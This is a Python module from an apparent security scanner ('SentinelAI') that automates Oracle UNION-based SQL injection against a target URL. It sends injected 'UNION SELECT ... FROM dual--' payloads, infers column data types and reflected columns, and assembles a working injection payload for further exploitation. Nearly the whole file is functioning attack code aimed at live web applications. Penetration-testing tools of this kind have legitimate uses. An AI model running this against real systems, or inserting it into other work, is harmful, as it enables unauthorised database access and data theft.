# app/modules/scanner/datatype_detector.py
"""
Oracle Data Type Detection for SentinelAI.
Phase 10: Detects column data types for UNION-based injection.
"""

import logging
import time
from dataclasses import dataclass, field
from typing import Any

import requests

from .html_parser import HTMLParser
from .regex_utils import RegexUtils
from .union_sqli import UnionSQLi

# ============================================================
# Data Classes
# ============================================================


@dataclass
class DataTypeDetectionResult:
    """
    Data type detection result.
    Contains column type information for UNION injection.
    """

    success: bool = False
    column_count: int = 0
    column_types: dict[int, str] = field(default_factory=dict)  # column_index -> type
    reflective_columns: list[int] = field(default_factory=list)
    working_union_payload: str | None = None
    best_reflective_column: int | None = None
    best_printable_column: int | None = None
    confidence: int = 0
    execution_time: float = 0.0
    errors: list[str] = field(default_factory=list)
    raw_responses: dict[str, str] = field(default_factory=dict)

    def add_error(self, error: str):
        """Add an error to the result."""
        self.errors.append(error)

    def set_column_type(self, index: int, data_type: str):
        """Set the data type for a column."""
        self.column_types[index] = data_type

    def get_column_type(self, index: int) -> str | None:
        """Get the data type for a column."""
        return self.column_types.get(index)

    def get_summary(self) -> str:
        """Get a summary of the data type detection result."""
        if not self.success:
            return "Data type detection failed"

        parts = []
        if self.column_count > 0:
            parts.append(f"Columns: {self.column_count}")
        if self.column_types:
            type_summary = {}
            for idx, dtype in self.column_types.items():
                type_summary[dtype] = type_summary.get(dtype, 0) + 1
            type_str = ", ".join([f"{k}: {v}" for k, v in type_summary.items()])
            parts.append(f"Types: {type_str}")
        if self.reflective_columns:
            parts.append(f"Reflective: {len(self.reflective_columns)} columns")
        if self.best_reflective_column:
            parts.append(f"Best reflective: column {self.best_reflective_column}")
        if self.confidence > 0:
            parts.append(f"Confidence: {self.confidence}%")
        if self.errors:
            parts.append(f"Errors: {len(self.errors)}")

        return f"Data Types: {', '.join(parts)}" if parts else "Data Types: No data"

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary for logging/output."""
        return {
            "success": self.success,
            "column_count": self.column_count,
            "column_types": self.column_types,
            "reflective_columns": self.reflective_columns,
            "working_union_payload": self.working_union_payload,
            "best_reflective_column": self.best_reflective_column,
            "best_printable_column": self.best_printable_column,
            "confidence": self.confidence,
            "execution_time": self.execution_time,
            "errors": self.errors,
            "summary": self.get_summary(),
        }


# ============================================================
# Main Data Type Detector Class
# ============================================================


class OracleDataTypeDetector:
    """
    Oracle Data Type Detection engine.
    Phase 10: Detects column data types for UNION-based injection.
    """

    # ============================================================
    # Constants
    # ============================================================

    # Data type constants
    TYPE_STRING = "VARCHAR2"
    TYPE_NUMBER = "NUMBER"
    TYPE_DATE = "DATE"
    TYPE_NULL = "NULL"
    TYPE_LOB = "LOB"
    TYPE_UNKNOWN = "UNKNOWN"

    # Confidence levels
    CONFIDENCE_HIGH = 90
    CONFIDENCE_MEDIUM = 70
    CONFIDENCE_LOW = 50

    # Test values for each data type
    TEST_VALUES = {
        TYPE_STRING: ["'TEST'", "'ABC'", "'123'", "'DATA'"],
        TYPE_NUMBER: ["1", "2", "3", "42"],
        TYPE_DATE: ["SYSDATE", "DATE'2024-01-01'", "CURRENT_DATE"],
        TYPE_NULL: ["NULL"],
        TYPE_LOB: ["EMPTY_CLOB()", "EMPTY_BLOB()"],
    }

    # Type detection priority (order to test)
    TYPE_PRIORITY = [TYPE_STRING, TYPE_NUMBER, TYPE_DATE, TYPE_LOB, TYPE_NULL]

    # ============================================================
    # Initialization
    # ============================================================

    def __init__(
        self,
        session: requests.Session,
        base_url: str,
        logger: logging.Logger | None = None,
    ):
        """
        Initialize Oracle Data Type Detector.

        Args:
            session: Requests session for HTTP requests
            base_url: Target base URL
            logger: Optional logger instance
        """
        self.session = session
        self.base_url = base_url
        self.logger = logger or self._setup_logger()

        # Initialize components
        self.union_sqli = UnionSQLi(session, base_url, logger)
        self.html_parser = HTMLParser()
        self.regex_utils = RegexUtils()

        # State
        self.baseline_response = None
        self.baseline_size = 0
        self.datatype_result = None
        self.column_count = 0
        self.reflective_columns = []

        self.logger.info(
            "[DataTypeDetector] Module initialized for data type detection"
        )
        self.logger.info(f"[DataTypeDetector] Target: {base_url}")

    def _setup_logger(self) -> logging.Logger:
        """Set up default logger."""
        logger = logging.getLogger("DataTypeDetector")
        logger.setLevel(logging.DEBUG)

        if not logger.handlers:
            ch = logging.StreamHandler()
            ch.setLevel(logging.DEBUG)
            formatter = logging.Formatter(
                "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
            )
            ch.setFormatter(formatter)
            logger.addHandler(ch)

        return logger

    # ============================================================
    # Private Methods
    # ============================================================

    def _get_baseline(self, injection_point: str) -> requests.Response | None:
        """Get baseline response for comparison."""
        if self.baseline_response is None:
            self.logger.info("[DataTypeDetector] Fetching baseline response...")
            self.baseline_response = self.union_sqli.get_baseline(injection_point)

            if self.baseline_response:
                self.baseline_size = len(self.baseline_response.text)
                self.logger.info(
                    f"[DataTypeDetector] Baseline size: {self.baseline_size} bytes"
                )
            else:
                self.logger.warning(
                    "[DataTypeDetector] Failed to get baseline response"
                )

        return self.baseline_response

    def _send_payload_with_metrics(
        self, injection_point: str, payload: str, baseline: requests.Response | None
    ) -> dict[str, Any]:
        """Send payload and collect metrics."""
        start_time = time.time()

        result = self.union_sqli.test_payload(injection_point, payload, baseline)

        elapsed = time.time() - start_time

        if not result["success"] or result.get("response") is None:
            return {
                "success": False,
                "response": None,
                "size": 0,
                "time": elapsed,
                "has_changed": False,
                "error": "Request failed",
            }

        response = result["response"]
        response_text = response.text

        return {
            "success": True,
            "response": response,
            "response_text": response_text,
            "size": len(response_text),
            "time": elapsed,
            "has_changed": result.get("has_changed", False),
            "status_code": response.status_code,
        }

    def _build_union_payload(
        self, column_count: int, column_values: dict[int, str]
    ) -> str:
        """
        Build a UNION payload with specified column values.

        Args:
            column_count: Total number of columns
            column_values: Dictionary mapping column index -> value

        Returns:
            str: UNION payload
        """
        values = []
        for i in range(1, column_count + 1):
            if i in column_values:
                values.append(column_values[i])
            else:
                values.append("NULL")

        payload = f"UNION SELECT {','.join(values)} FROM dual--"
        return payload

    def _detect_column_type(
        self,
        injection_point: str,
        column_index: int,
        column_count: int,
        baseline: requests.Response | None,
    ) -> tuple[str | None, int]:
        """
        Detect the data type of a specific column.

        Args:
            injection_point: Parameter to inject into
            column_index: Column index (1-based)
            column_count: Total number of columns
            baseline: Baseline response

        Returns:
            Tuple[Optional[str], int]: (Data type, confidence)
        """
        self.logger.debug(
            f"[DataTypeDetector] Detecting type for column {column_index}"
        )

        # Track which types worked
        working_types = []

        for data_type in self.TYPE_PRIORITY:
            test_values = self.TEST_VALUES.get(data_type, [])
            type_worked = False

            for test_value in test_values:
                # Build payload with only this column set
                column_values = {column_index: test_value}
                payload = self._build_union_payload(column_count, column_values)
                payload = f"'{payload}"

                result = self._send_payload_with_metrics(
                    injection_point, payload, baseline
                )

                if not result["success"]:
                    continue

                # Check if it worked (no Oracle error, response changed)
                if "ORA-" not in result["response_text"] and result["has_changed"]:
                    type_worked = True
                    working_types.append(data_type)
                    self.logger.debug(
                        f"[DataTypeDetector] Column {column_index} accepts {data_type}"
                    )
                    break

            if type_worked:
                break

        # Determine best type
        if working_types:
            # Prefer more specific types
            type_order = [
                self.TYPE_STRING,
                self.TYPE_NUMBER,
                self.TYPE_DATE,
                self.TYPE_LOB,
                self.TYPE_NULL,
            ]
            for dtype in type_order:
                if dtype in working_types:
                    confidence = (
                        self.CONFIDENCE_HIGH
                        if dtype != self.TYPE_NULL
                        else self.CONFIDENCE_MEDIUM
                    )
                    return dtype, confidence

        return self.TYPE_UNKNOWN, self.CONFIDENCE_LOW

    def _detect_reflective_columns(
        self,
        injection_point: str,
        column_count: int,
        baseline: requests.Response | None,
    ) -> list[int]:
        """
        Detect which columns are reflective.

        Args:
            injection_point: Parameter to inject into
            column_count: Number of columns
            baseline: Baseline response

        Returns:
            List[int]: Reflective column indices
        """
        self.logger.info("[DataTypeDetector] Detecting reflective columns...")

        reflective_indices = []

        for idx in range(1, column_count + 1):
            self.logger.debug(
                f"[DataTypeDetector] Testing column {idx} for reflection..."
            )

            test_value = f"'REFL_{idx}'"
            column_values = {idx: test_value}
            payload = self._build_union_payload(column_count, column_values)
            payload = f"'{payload}"

            result = self._send_payload_with_metrics(injection_point, payload, baseline)

            if result["success"] and result["response_text"]:
                # Check if test value appears in response
                if f"REFL_{idx}" in result["response_text"]:
                    reflective_indices.append(idx)
                    self.logger.info(f"[DataTypeDetector] Column {idx} is reflective")
                else:
                    self.logger.debug(
                        f"[DataTypeDetector] Column {idx} is NOT reflective"
                    )

        self.logger.info(
            f"[DataTypeDetector] Found {len(reflective_indices)} reflective columns: {reflective_indices}"
        )
        return reflective_indices

    def _find_best_reflective_column(self, reflective_indices: list[int]) -> int | None:
        """
        Find the best reflective column (first one).

        Args:
            reflective_indices: List of reflective column indices

        Returns:
            Optional[int]: Best reflective column index
        """
        return reflective_indices[0] if reflective_indices else None

    def _find_best_printable_column(
        self,
        injection_point: str,
        column_count: int,
        reflective_indices: list[int],
        baseline: requests.Response | None,
    ) -> int | None:
        """
        Find the best printable column (string type).

        Args:
            injection_point: Parameter to inject into
            column_count: Number of columns
            reflective_indices: List of reflective columns
            baseline: Baseline response

        Returns:
            Optional[int]: Best printable column index
        """
        for idx in reflective_indices:
            # Test if column can hold string data
            column_values = {idx: "'TEST'"}
            payload = self._build_union_payload(column_count, column_values)
            payload = f"'{payload}"

            result = self._send_payload_with_metrics(injection_point, payload, baseline)

            if result["success"] and "ORA-" not in result["response_text"]:
                return idx

        return reflective_indices[0] if reflective_indices else None

    # ============================================================
    # Public Methods
    # ============================================================

    def detect_column_types(
        self,
        injection_point: str,
        column_count: int | None = None,
        max_columns: int = 30,
    ) -> DataTypeDetectionResult:
        """
        Detect data types for all columns.

        Args:
            injection_point: Parameter to inject into
            column_count: Pre-detected column count (optional)
            max_columns: Maximum columns to test

        Returns:
            DataTypeDetectionResult: Detection result
        """
        self.logger.info(
            "[DataTypeDetector] =================================================="
        )
        self.logger.info("[DataTypeDetector] PHASE 10: Data Type Detection")
        self.logger.info(
            "[DataTypeDetector] =================================================="
        )

        result = DataTypeDetectionResult()
        total_start = time.time()

        try:
            # Get baseline
            baseline = self._get_baseline(injection_point)
            if not baseline:
                result.add_error("Failed to get baseline response")
                return result

            # Determine column count
            if column_count is None or column_count == 0:
                self.logger.info("[DataTypeDetector] Detecting column count...")
                from .column_detector import OracleColumnDetector

                column_detector = OracleColumnDetector(
                    self.session, self.base_url, self.logger
                )
                col_result = column_detector.detect_column_count(
                    injection_point, max_columns
                )

                if not col_result.success:
                    result.add_error("Failed to detect column count")
                    return result

                self.column_count = col_result.column_count
                self.reflective_columns = col_result.reflective_columns
            else:
                self.column_count = column_count
                self.logger.info(
                    f"[DataTypeDetector] Using provided column count: {self.column_count}"
                )

            if self.column_count == 0:
                result.add_error("No columns detected")
                return result

            result.column_count = self.column_count

            # Detect reflective columns if not already known
            if not self.reflective_columns:
                self.reflective_columns = self._detect_reflective_columns(
                    injection_point, self.column_count, baseline
                )

            result.reflective_columns = self.reflective_columns

            # Detect data types for each column
            self.logger.info(
                f"[DataTypeDetector] Detecting types for {self.column_count} columns..."
            )

            for idx in range(1, self.column_count + 1):
                data_type, confidence = self._detect_column_type(
                    injection_point, idx, self.column_count, baseline
                )
                result.set_column_type(idx, data_type)
                self.logger.debug(
                    f"[DataTypeDetector] Column {idx}: {data_type} (confidence: {confidence}%)"
                )

            # Find best reflective column
            result.best_reflective_column = self._find_best_reflective_column(
                self.reflective_columns
            )

            # Find best printable column
            result.best_printable_column = self._find_best_printable_column(
                injection_point, self.column_count, self.reflective_columns, baseline
            )

            # Build working UNION payload
            if self.reflective_columns:
                best_col = self.reflective_columns[0]
                column_values = {best_col: "'PAYLOAD'"}
                result.working_union_payload = self._build_union_payload(
                    self.column_count, column_values
                )
                result.working_union_payload = f"'{result.working_union_payload}"

            # Calculate confidence
            type_known = sum(
                1 for t in result.column_types.values() if t != self.TYPE_UNKNOWN
            )
            result.confidence = (
                int((type_known / self.column_count) * 100)
                if self.column_count > 0
                else 0
            )
            result.confidence = min(result.confidence, 100)

            # Determine overall success
            result.success = result.column_count > 0 and type_known > 0

        except Exception as e:
            error_msg = f"Data type detection failed: {e!s}"
            self.logger.error(error_msg)
            result.add_error(error_msg)
            result.success = False

        result.execution_time = time.time() - total_start

        self.logger.info(
            "[DataTypeDetector] =================================================="
        )
        self.logger.info("[DataTypeDetector] DATA TYPE DETECTION COMPLETE")
        self.logger.info(f"[DataTypeDetector] {result.get_summary()}")
        self.logger.info(f"[DataTypeDetector] Time: {result.execution_time:.2f}s")
        self.logger.info(
            "[DataTypeDetector] =================================================="
        )

        self.datatype_result = result
        return result

    def detect_string_columns(
        self, injection_point: str, column_count: int
    ) -> list[int]:
        """
        Detect which columns accept string values.

        Args:
            injection_point: Parameter to inject into
            column_count: Number of columns

        Returns:
            List[int]: String column indices
        """
        self.logger.info("[DataTypeDetector] Detecting string columns...")

        baseline = self._get_baseline(injection_point)
        string_columns = []

        for idx in range(1, column_count + 1):
            column_values = {idx: "'TEST'"}
            payload = self._build_union_payload(column_count, column_values)
            payload = f"'{payload}"

            result = self._send_payload_with_metrics(injection_point, payload, baseline)

            if result["success"] and "ORA-" not in result["response_text"]:
                string_columns.append(idx)

        self.logger.info(
            f"[DataTypeDetector] Found {len(string_columns)} string columns: {string_columns}"
        )
        return string_columns

    def detect_numeric_columns(
        self, injection_point: str, column_count: int
    ) -> list[int]:
        """
        Detect which columns accept numeric values.

        Args:
            injection_point: Parameter to inject into
            column_count: Number of columns

        Returns:
            List[int]: Numeric column indices
        """
        self.logger.info("[DataTypeDetector] Detecting numeric columns...")

        baseline = self._get_baseline(injection_point)
        numeric_columns = []

        for idx in range(1, column_count + 1):
            column_values = {idx: "42"}
            payload = self._build_union_payload(column_count, column_values)
            payload = f"'{payload}"

            result = self._send_payload_with_metrics(injection_point, payload, baseline)

            if result["success"] and "ORA-" not in result["response_text"]:
                numeric_columns.append(idx)

        self.logger.info(
            f"[DataTypeDetector] Found {len(numeric_columns)} numeric columns: {numeric_columns}"
        )
        return numeric_columns

    def detect_date_columns(self, injection_point: str, column_count: int) -> list[int]:
        """
        Detect which columns accept date values.

        Args:
            injection_point: Parameter to inject into
            column_count: Number of columns

        Returns:
            List[int]: Date column indices
        """
        self.logger.info("[DataTypeDetector] Detecting date columns...")

        baseline = self._get_baseline(injection_point)
        date_columns = []

        for idx in range(1, column_count + 1):
            column_values = {idx: "SYSDATE"}
            payload = self._build_union_payload(column_count, column_values)
            payload = f"'{payload}"

            result = self._send_payload_with_metrics(injection_point, payload, baseline)

            if result["success"] and "ORA-" not in result["response_text"]:
                date_columns.append(idx)

        self.logger.info(
            f"[DataTypeDetector] Found {len(date_columns)} date columns: {date_columns}"
        )
        return date_columns

    def detect_null_columns(self, injection_point: str, column_count: int) -> list[int]:
        """
        Detect which columns accept NULL values.

        Args:
            injection_point: Parameter to inject into
            column_count: Number of columns

        Returns:
            List[int]: NULL column indices
        """
        self.logger.info("[DataTypeDetector] Detecting NULL columns...")

        baseline = self._get_baseline(injection_point)
        null_columns = []

        for idx in range(1, column_count + 1):
            column_values = {idx: "NULL"}
            payload = self._build_union_payload(column_count, column_values)
            payload = f"'{payload}"

            result = self._send_payload_with_metrics(injection_point, payload, baseline)

            if result["success"] and "ORA-" not in result["response_text"]:
                null_columns.append(idx)

        self.logger.info(
            f"[DataTypeDetector] Found {len(null_columns)} NULL columns: {null_columns}"
        )
        return null_columns

    def detect_reflective_columns(
        self, injection_point: str, column_count: int
    ) -> list[int]:
        """
        Detect reflective columns.

        Args:
            injection_point: Parameter to inject into
            column_count: Number of columns

        Returns:
            List[int]: Reflective column indices
        """
        baseline = self._get_baseline(injection_point)
        return self._detect_reflective_columns(injection_point, column_count, baseline)

    def build_union_payload(
        self, column_count: int, reflective_column: int, payload_value: str
    ) -> str:
        """
        Build a UNION payload for a specific column.

        Args:
            column_count: Number of columns
            reflective_column: Reflective column index
            payload_value: Value to inject

        Returns:
            str: UNION payload
        """
        column_values = {reflective_column: f"'{payload_value}'"}
        payload = self._build_union_payload(column_count, column_values)
        return f"'{payload}"

    def verify_payload(self, injection_point: str, payload: str) -> bool:
        """
        Verify a UNION payload works.

        Args:
            injection_point: Parameter to inject into
            payload: UNION payload

        Returns:
            bool: True if payload works
        """
        baseline = self._get_baseline(injection_point)
        result = self._send_payload_with_metrics(injection_point, payload, baseline)

        return (
            result["success"]
            and "ORA-" not in result["response_text"]
            and result["has_changed"]
        )

    def get_best_union_payload(
        self, injection_point: str, column_count: int | None = None
    ) -> str | None:
        """
        Get the best UNION payload for injection.

        Args:
            injection_point: Parameter to inject into
            column_count: Optional pre-detected column count

        Returns:
            Optional[str]: Best UNION payload
        """
        if (
            self.datatype_result is None
            or self.datatype_result.working_union_payload is None
        ):
            result = self.detect_column_types(injection_point, column_count)
            if result.success:
                return result.working_union_payload
            return None

        return self.datatype_result.working_union_payload

    def get_reflective_column(
        self, injection_point: str, column_count: int | None = None
    ) -> int | None:
        """
        Get the best reflective column.

        Args:
            injection_point: Parameter to inject into
            column_count: Optional pre-detected column count

        Returns:
            Optional[int]: Best reflective column index
        """
        if (
            self.datatype_result is None
            or self.datatype_result.best_reflective_column is None
        ):
            result = self.detect_column_types(injection_point, column_count)
            if result.success:
                return result.best_reflective_column
            return None

        return self.datatype_result.best_reflective_column
